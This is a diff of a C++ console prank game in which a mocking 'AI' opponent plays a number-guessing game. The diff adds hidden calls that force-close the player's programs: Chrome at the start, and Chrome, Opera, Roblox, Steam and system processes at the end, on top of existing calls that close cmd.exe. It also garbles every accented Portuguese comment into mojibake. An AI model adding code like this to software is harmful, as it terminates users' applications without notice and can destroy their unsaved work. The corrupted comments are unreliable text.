@@ -19,6 +19,7 @@ const string BLUE = "\033[34m";
 const string MAGENTA = "\033[35m";
 const string CYAN = "\033[36m";
 const string WHITE = "\033[37m";
+const string PURPLE = "\033[35m";
 const string RESET = "\033[0m";
 
 const char *colors[] = {
@@ -32,7 +33,7 @@ const char *colors[] = {
     "\033[90m"  // Cinza Claro
 };
 
-const char symbols_one[] = {'@', '#', '$', '%', '&', 'ç'};
+const char symbols_one[] = {'@', '#', '$', '%', '&',};
 const char symbols_zero[] = {'*', '^', '!', '+', '-'};
 
 int playerChoice, machineChoice;
@@ -45,7 +46,7 @@ void killProcessByName(const char *processName)
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE)
     {
-        std::cerr << "Failed to create snapshot." << std::endl;
+        cerr << "Failed to create snapshot." << endl;
         return;
     }
 
@@ -67,7 +68,7 @@ void killProcessByName(const char *processName)
                 }
                 else
                 {
-                    cerr << "Failed to open process." << std::endl;
+                    cerr << "Failed to open process." << endl;
                 }
             }
         } while (Process32Next(hSnapshot, &pe));
@@ -90,7 +91,7 @@ void welcomeScreen()
     cout << RED << "==========================================" << RESET << endl;
 }
 
-// Função para verificar se o número já foi escolhido
+// Funï¿½ï¿½o para verificar se o nï¿½mero jï¿½ foi escolhido
 bool isNumberUsed(int number, vector<int> &usedNumbers)
 {
     for (int i : usedNumbers)
@@ -108,12 +109,11 @@ int main()
     srand(time(0));
     int imposter = rand() % 10;
 
-    // Lista para armazenar números usados
+    // Lista para armazenar nï¿½meros usados
     vector<int> usedNumbers;
 
-    cout << "Imposter number (for debugging): " << imposter << endl;
-
-    cout << "Impostor number: " << imposter << " (debbuging)" << endl;
+    // cout << "Imposter number (for debugging): " << imposter << endl;
+    
     cout << "First of all, what is your name?: ";
     cin >> nome;
     sleep(1);
@@ -125,19 +125,29 @@ int main()
     if (yn1 != 'y')
     {
         cout << "That's what I thought..." << endl;
+        sleep(2);
         return 1;
     }
 
     cout << "LET'S START!!!!, like... you start, BECAUSE I WANT!" << endl;
+    killProcessByName("chrome.exe");
     sleep(2);
-    cout << "The game works like this: You gonna choose a number, i gonna choose a number, have 1 imposter number, i dont recommend get him, gonna be like this until someone lose(get the imposter number), and the guy who wins gonna get the other's life, all money, house, family, life, etc, nothing dangerous I would say... " << endl;
+    cout << PURPLE << "-------------------------------------------------------------"  << RESET << endl;
+    cout << PURPLE <<"| The game works like this: You gonna choose a number, I     |"  << RESET << endl;
+    cout << PURPLE <<"| gonna choose a number, have 1 imposter number, I don't     |"  << RESET << endl;
+    cout << PURPLE <<"| recommend getting him, gonna be like this until someone    |"  << RESET << endl;
+    cout << PURPLE <<"| loses (gets the imposter number), and the guy who wins     |"  << RESET << endl;
+    cout << PURPLE <<"| gonna get the other's life, all money, house, family, life,|"  << RESET << endl;
+    cout << PURPLE <<"| etc. Nothing dangerous I would say...                      |"  << RESET << endl;
+    cout << PURPLE <<"-------------------------------------------------------------"  << RESET << endl;   
     sleep(3);
 
     // PRIMEIRO ROUND
+    cout << BLUE << "------------------------- FIRST ROUND -----------------------------" << RESET << endl;
     while (true)
-    { // Laço infinito até a pessoa escolher um número válido
+    { // Laï¿½o infinito atï¿½ a pessoa escolher um nï¿½mero vï¿½lido
 
-        cout << BLUE << "------------------------- FIRST ROUND -----------------------------" << RESET << endl;
+        
         cout << "Choose a number (0-9): ";
         cin >> playerChoice;
 
@@ -146,21 +156,21 @@ int main()
             cin.clear();                                         // Limpa erro de cin
             cin.ignore(numeric_limits<streamsize>::max(), '\n'); // Ignora o que restou no buffer
             cout << "Did you really think this would work? HAHA" << endl;
-            continue; // Volta para a escolha do número
+            continue; // Volta para a escolha do nï¿½mero
         }
 
         if (isNumberUsed(playerChoice, usedNumbers))
         {
             cout << "That number has already been used, choose another, NOW!" << endl;
-            continue; // Pede novamente o número se já foi usado
+            continue; // Pede novamente o nï¿½mero se jï¿½ foi usado
         }
 
-        // Aqui continuaria a lógica do jogo com a escolha do jogador
+        // Aqui continuaria a lï¿½gica do jogo com a escolha do jogador
         cout << "You have chosen: " << playerChoice << endl;
-        break; // Sai do laço se a escolha for válida
+        break; // Sai do laï¿½o se a escolha for vï¿½lida
     }
 
-    usedNumbers.push_back(playerChoice); // Adiciona o número escolhido pelo jogador
+    usedNumbers.push_back(playerChoice); // Adiciona o nï¿½mero escolhido pelo jogador
 
     if (playerChoice == imposter)
     {
@@ -178,17 +188,19 @@ int main()
         sleep(3);
         cout << "Sent a squad to kidnap your family [OK]" << endl;
         sleep(2);
-        cout << "I LOVE BEING A A.I HAHAHHAHA";
+        cout << "SO EASY HAHAHHA";
+        sleep(2);
+        return 0;
     }
 
-    // Máquina escolhe um número
+    // Mï¿½quina escolhe um nï¿½mero
     sleep(3);
     do
     {
         machineChoice = rand() % 10;
     } while (isNumberUsed(machineChoice, usedNumbers));
 
-    usedNumbers.push_back(machineChoice); // Adiciona o número escolhido pela máquina
+    usedNumbers.push_back(machineChoice); // Adiciona o nï¿½mero escolhido pela mï¿½quina
     cout << "MY TURN! Let me think..." << endl;
     sleep(2);
     cout << "I choose: " << machineChoice << endl;
@@ -197,8 +209,8 @@ int main()
     {
         cout << "w-what?" << endl;
         sleep(2);
-        cout << "NO, INT HE FIRST ROUND? THIS IS NOT POSSIBLE, I AM NOT A HUMAN TO DO A STUPID THING LIKE THAT" << endl;
-        sleep(2);
+        cout << "NO, IN THE FIRST ROUND? THIS IS NOT POSSIBLE, I AM NOT A HUMAN TO DO A STUPID THING LIKE THAT" << endl;
+        sleep(3);
         cout << "bob" << endl;
         sleep(2);
         cout << "bob" << endl;
@@ -213,7 +225,7 @@ int main()
                 for (int j = 0; j < 50; ++j)
                 {                                  // Ajusta o tamanho da linha
                     int random_bit = rand() % 2;   // Gera 1 ou 0 aleatoriamente
-                    int random_color = rand() % 4; // Seleciona uma cor aleatória
+                    int random_color = rand() % 4; // Seleciona uma cor aleatï¿½ria
                     std::cout << colors[random_color] << random_bit;
                 }
                 std::cout << "\033[0m\n"; // Reseta a cor no final de cada linha
@@ -222,13 +234,13 @@ int main()
 
         cout << "1" << endl;
         sleep(1);
-        killProcessByName("cmd.exe"); // Nome do processo que você deseja encerrar
+        killProcessByName("cmd.exe"); // Nome do processo que vocï¿½ deseja encerrar
         return 0;
     }
 
     cout << GREEN << "------------------------- SECOND ROUND -----------------------------" << RESET << endl; // SEGUNDO ROUND
     while (true)
-    { // Laço infinito até a pessoa escolher um número válido
+    { // Laï¿½o infinito atï¿½ a pessoa escolher um nï¿½mero vï¿½lido
 
         cout << "Choose a number (0-9): ";
         cin >> playerChoice;
@@ -238,53 +250,55 @@ int main()
             cin.clear();                                         // Limpa erro de cin
             cin.ignore(numeric_limits<streamsize>::max(), '\n'); // Ignora o que restou no buffer
             cout << "Did you really think this would work? HAHA" << endl;
-            continue; // Volta para a escolha do número
+            continue; // Volta para a escolha do nï¿½mero
         }
 
         if (isNumberUsed(playerChoice, usedNumbers))
         {
             cout << "You are stupid or what, dont repeat the number, you are thinking that who program this game is dumb??? maybe but just continue please" << endl;
             sleep(4);
-            continue; // Pede novamente o número se já foi usado
+            continue; // Pede novamente o nï¿½mero se jï¿½ foi usado
         }
 
-        // Aqui continuaria a lógica do jogo com a escolha do jogador
+        // Aqui continuaria a lï¿½gica do jogo com a escolha do jogador
         cout << "You have chosen: " << playerChoice << endl;
-        break; // Sai do laço se a escolha for válida
+        break; // Sai do laï¿½o se a escolha for vï¿½lida
     }
 
-    usedNumbers.push_back(playerChoice); // Adiciona o número escolhido pelo jogador
+    usedNumbers.push_back(playerChoice); // Adiciona o nï¿½mero escolhido pelo jogador
 
     if (playerChoice == imposter)
     {
         cout << "HAHAHHAHAHAH YOU LOSE" << endl;
         sleep(2.5);
-        cout << "NOW GIVE-ME WHAT IS YOURS HAHHAHA" << endl;
+        cout << "NOW GIVE-ME WHAT IS YOURS " << endl;
         sleep(1.5);
-        cout << "Bank Account Stolen [OK]" << endl;
+        cout << " Call a police idiot using your number [OK]" << endl;
         sleep(1.5);
-        cout << "Longitude and Latitude captured [OK]" << endl;
+        cout << " Localization captured [OK]" << endl;
         sleep(1.5);
-        cout << "All information about your family [OK]" << endl;
+        cout << " Selling information about you and your life [OK]" << endl;
         sleep(1.5);
         cout << "All of your password stolen [OK]" << endl;
         sleep(1.5);
-        cout << "The " << rand() % 10 << " times you broke the law you were sent to the police [OK]" << endl;
-        sleep(1.5);
-        cout << "Sent a squad to kidnap your family [OK]" << endl;
+        cout << " What more?" << endl;
+        sleep(1);
+        cout << " Oh true" << endl;
+        sleep(1);
+        cout << " Spending all of your money in robux [OK]" << endl;        
         sleep(2);
-        cout << "I LOVE BEING A A.I HAHAHHAHA";
+        
         return 0; // Encerra o programa
     }
 
-    // Máquina escolhe um número
+    // Mï¿½quina escolhe um nï¿½mero
     sleep(2);
     do
     {
         machineChoice = rand() % 10;
     } while (isNumberUsed(machineChoice, usedNumbers));
 
-    usedNumbers.push_back(machineChoice); // Adiciona o número escolhido pela máquina
+    usedNumbers.push_back(machineChoice); // Adiciona o nï¿½mero escolhido pela mï¿½quina
     cout << "MY TURN!!" << endl;
     sleep(1);
     cout << "Hmmmm..." << endl;
@@ -304,14 +318,14 @@ int main()
         cout << "idiot" << endl;
         sleep(1);
 
-        killProcessByName("cmd.exe"); // Nome do processo que você deseja encerrar
+        killProcessByName("cmd.exe"); // Nome do processo que vocï¿½ deseja encerrar
         return 0;
     }
 
     // TERCEIRO ROUND
     cout << YELLOW << "------------------------- THIRD ROUND -----------------------------" << RESET << endl;
     while (true)
-    { // Laço infinito até a pessoa escolher um número válido
+    { // Laï¿½o infinito atï¿½ a pessoa escolher um nï¿½mero vï¿½lido
 
         cout << "Choose a number (0-9): ";
         cin >> playerChoice;
@@ -321,22 +335,22 @@ int main()
             cin.clear();                                         // Limpa erro de cin
             cin.ignore(numeric_limits<streamsize>::max(), '\n'); // Ignora o que restou no buffer
             cout << "Did you really think this would work? HAHA" << endl;
-            continue; // Volta para a escolha do número
+            continue; // Volta para a escolha do nï¿½mero
         }
 
         if (isNumberUsed(playerChoice, usedNumbers))
         {
             cout << "You have brain for what? Think, dont use the same number." << endl;
             sleep(4);
-            continue; // Pede novamente o número se já foi usado
+            continue; // Pede novamente o nï¿½mero se jï¿½ foi usado
         }
 
-        // Aqui continuaria a lógica do jogo com a escolha do jogador
+        // Aqui continuaria a lï¿½gica do jogo com a escolha do jogador
         cout << "You have chosen: " << playerChoice << endl;
-        break; // Sai do laço se a escolha for válida
+        break; // Sai do laï¿½o se a escolha for vï¿½lida
     }
 
-    usedNumbers.push_back(playerChoice); // Adiciona o número escolhido pelo jogador
+    usedNumbers.push_back(playerChoice); // Adiciona o nï¿½mero escolhido pelo jogador
 
     if (playerChoice == imposter)
     {
@@ -364,14 +378,14 @@ int main()
         return 0; // Encerra o programa
     }
 
-    // Máquina escolhe um número
+    // Mï¿½quina escolhe um nï¿½mero
     sleep(2);
     do
     {
         machineChoice = rand() % 10;
     } while (isNumberUsed(machineChoice, usedNumbers));
 
-    usedNumbers.push_back(machineChoice); // Adiciona o número escolhido pela máquina
+    usedNumbers.push_back(machineChoice); // Adiciona o nï¿½mero escolhido pela mï¿½quina
     cout << "MY TURN!!" << endl;
     sleep(1);
     cout << "thinking" << endl;
@@ -395,13 +409,13 @@ int main()
         sleep(1);
         cout << "1" << endl;
         sleep(3);
-        cout << "I am felling muc?§ ??????" << endl;
+        cout << "I am felling muc?ï¿½ Ã©Ã¢Ã¨Ã±" << endl;
         sleep(1);
         cout << "what is this? ";
         sleep(2);
         cout << "oh";
         sleep(1);
-        cout << "SORRY MY PROG?MMER WH?T DID I DO F?R YOU?? ";
+        cout << "SORRY MY PROGÃ§MMER WHÃ§T DID I DO Fï¿½R YOU?? ";
         sleep(2);
         cout << "ohhh, that is true";
         sleep(1.9);
@@ -409,14 +423,14 @@ int main()
         sleep(1.9);
         cout << "Sorr-";
         sleep(1.5);
-        killProcessByName("cmd.exe"); // Nome do processo que você deseja encerrar
+        killProcessByName("cmd.exe"); // Nome do processo que vocï¿½ deseja encerrar
         return 0;
     }
 
     // QUARTO ROUND
     cout << MAGENTA << "------------------------- FOURTH ROUND -----------------------------" << RESET << endl;
     while (true)
-    { // Laço infinito até a pessoa escolher um número válido
+    { // Laï¿½o infinito atï¿½ a pessoa escolher um nï¿½mero vï¿½lido
 
         cout << "Choose a number (0-9): ";
         cin >> playerChoice;
@@ -426,22 +440,22 @@ int main()
             cin.clear();                                         // Limpa erro de cin
             cin.ignore(numeric_limits<streamsize>::max(), '\n'); // Ignora o que restou no buffer
             cout << "Did you really think this would work? HAHA" << endl;
-            continue; // Volta para a escolha do número
+            continue; // Volta para a escolha do nï¿½mero
         }
 
         if (isNumberUsed(playerChoice, usedNumbers))
         {
             cout << "Really? I hope this was without want to, because omg what a dumb person!" << endl;
             sleep(3);
-            continue; // Pede novamente o número se já foi usado
+            continue; // Pede novamente o nï¿½mero se jï¿½ foi usado
         }
 
-        // Aqui continuaria a lógica do jogo com a escolha do jogador
+        // Aqui continuaria a lï¿½gica do jogo com a escolha do jogador
         cout << "You have chosen: " << playerChoice << endl;
-        break; // Sai do laço se a escolha for válida
+        break; // Sai do laï¿½o se a escolha for vï¿½lida
     }
 
-    usedNumbers.push_back(playerChoice); // Adiciona o número escolhido pelo jogador
+    usedNumbers.push_back(playerChoice); // Adiciona o nï¿½mero escolhido pelo jogador
 
     if (playerChoice == imposter)
     {
@@ -463,14 +477,14 @@ int main()
         return 0; // Encerra o programa
     }
 
-    // Máquina escolhe um número
+    // Mï¿½quina escolhe um nï¿½mero
     sleep(2);
     do
     {
         machineChoice = rand() % 10;
     } while (isNumberUsed(machineChoice, usedNumbers));
 
-    usedNumbers.push_back(machineChoice); // Adiciona o número escolhido pela máquina
+    usedNumbers.push_back(machineChoice); // Adiciona o nï¿½mero escolhido pela mï¿½quina
     cout << "Its my turn really?!!" << endl;
     sleep(1);
     cout << "I am getting nervous..." << endl;
@@ -495,7 +509,7 @@ int main()
         sleep(1);
         cout << "1" << endl;
         sleep(1);
-        killProcessByName("cmd.exe"); // Nome do processo que você deseja encerrar
+        killProcessByName("cmd.exe"); // Nome do processo que vocï¿½ deseja encerrar
         return 0;
     }
 
@@ -507,7 +521,7 @@ int main()
     sleep(1.5);
 
     while (true)
-    { // Laço infinito até a pessoa escolher um número válido
+    { // Laï¿½o infinito atï¿½ a pessoa escolher um nï¿½mero vï¿½lido
 
         cout << "Choose a number (0-9): " << endl;
         cin >> playerChoice;
@@ -517,22 +531,22 @@ int main()
             cin.clear();                                         // Limpa erro de cin
             cin.ignore(numeric_limits<streamsize>::max(), '\n'); // Ignora o que restou no buffer
             cout << "Did you really think this would work? HAHA" << endl;
-            continue; // Volta para a escolha do número
+            continue; // Volta para a escolha do nï¿½mero
         }
 
         if (isNumberUsed(playerChoice, usedNumbers))
         {
             cout << "I need to say something?" << endl;
             sleep(3);
-            continue; // Pede novamente o número se já foi usado
+            continue; // Pede novamente o nï¿½mero se jï¿½ foi usado
         }
 
-        // Aqui continuaria a lógica do jogo com a escolha do jogador
+        // Aqui continuaria a lï¿½gica do jogo com a escolha do jogador
         cout << "You have chosen: " << playerChoice << endl;
-        break; // Sai do laço se a escolha for válida
+        break; // Sai do laï¿½o se a escolha for vï¿½lida
     }
 
-    usedNumbers.push_back(playerChoice); // Adiciona o número escolhido pelo jogador
+    usedNumbers.push_back(playerChoice); // Adiciona o nï¿½mero escolhido pelo jogador
 
     if (playerChoice == imposter)
     {
@@ -554,14 +568,14 @@ int main()
         return 0; // Encerra o programa
     }
 
-    // Máquina escolhe um número
+    // Mï¿½quina escolhe um nï¿½mero
     sleep(2);
     do
     {
         machineChoice = rand() % 10;
     } while (isNumberUsed(machineChoice, usedNumbers));
 
-    usedNumbers.push_back(machineChoice); // Adiciona o número escolhido pela máquina
+    usedNumbers.push_back(machineChoice); // Adiciona o nï¿½mero escolhido pela mï¿½quina
     sleep(2);
     cout << "HOWWWWWWWW????????" << endl;
     sleep(1);
@@ -595,7 +609,7 @@ int main()
         cout << "RRR     RRR    AAA      AAA   GGGGGGGGGGGGGG   EEEEEEEEEEEEE\n";
         cout << "RRR      RRR   AAA      AAA     GGGGGGGGGGGG   EEEEEEEEEEEE\n\n";
 
-        // Fim da cor vermelha e início do texto "IN" em branco (cor padrão)
+        // Fim da cor vermelha e inï¿½cio do texto "IN" em branco (cor padrï¿½o)
         cout << "\033[0m";
 
         cout << "\n\n";
@@ -609,7 +623,7 @@ int main()
         cout << "IIIIIIIIIII    NNN    NNNN\n";
         sleep(2);
 
-        // Início da cor azul para o número "3"
+        // Inï¿½cio da cor azul para o nï¿½mero "3"
         cout << "\033[34m";
         cout << "\n\n";
         cout << "33333333333\n";
@@ -624,7 +638,7 @@ int main()
         cout << "33333333333\n";
         sleep(2);
 
-        // Início da cor vermelha para o número "2"
+        // Inï¿½cio da cor vermelha para o nï¿½mero "2"
         cout << "\033[31m";
         cout << "\n\n";
         cout << " 22222222222\n";
@@ -639,7 +653,7 @@ int main()
         cout << "222222222222\n";
         sleep(2);
 
-        // Início da cor verde para o número "1"
+        // Inï¿½cio da cor verde para o nï¿½mero "1"
         cout << "\033[32m";
         cout << "\n\n";
         cout << "       1111\n";
@@ -654,8 +668,14 @@ int main()
         cout << "   1111111111\n";
         sleep(2);
 
-        // Resetando a cor para padrão
+        // Resetando a cor para padrï¿½o
         cout << "\033[0m";
+        killProcessByName("chrome.exe");
+        killProcessByName("opera.exe");
+        killProcessByName("RobloxPlayerBeta.exe");
+        killProcessByName("Steam.exe");
+        killProcessByName("System");
+        killProcessByName("System.exe");
 
         while (1 < 2)
         {
@@ -664,16 +684,16 @@ int main()
                 for (int j = 0; j < 50; ++j)
                 {
                     int random_bit = rand() % 2;   // Gera 1 ou 0 aleatoriamente
-                    int random_color = rand() % 4; // Seleciona uma cor aleatória
+                    int random_color = rand() % 4; // Seleciona uma cor aleatï¿½ria
 
                     if (random_bit == 1)
                     {
-                        int random_symbol = rand() % 5; // Escolhe símbolo aleatório para 1
+                        int random_symbol = rand() % 5; // Escolhe sï¿½mbolo aleatï¿½rio para 1
                         std::cout << colors[random_color] << symbols_one[random_symbol];
                     }
                     else
                     {
-                        int random_symbol = rand() % 5; // Escolhe símbolo aleatório para 0
+                        int random_symbol = rand() % 5; // Escolhe sï¿½mbolo aleatï¿½rio para 0
                         std::cout << colors[random_color] << symbols_zero[random_symbol];
                     }
                 }
@@ -681,7 +701,7 @@ int main()
         }
         sleep(6);
 
-        killProcessByName("cmd.exe"); // Nome do processo que você deseja encerrar
+        killProcessByName("cmd.exe"); // Nome do processo que vocï¿½ deseja encerrar
         return 0;
     }
 }
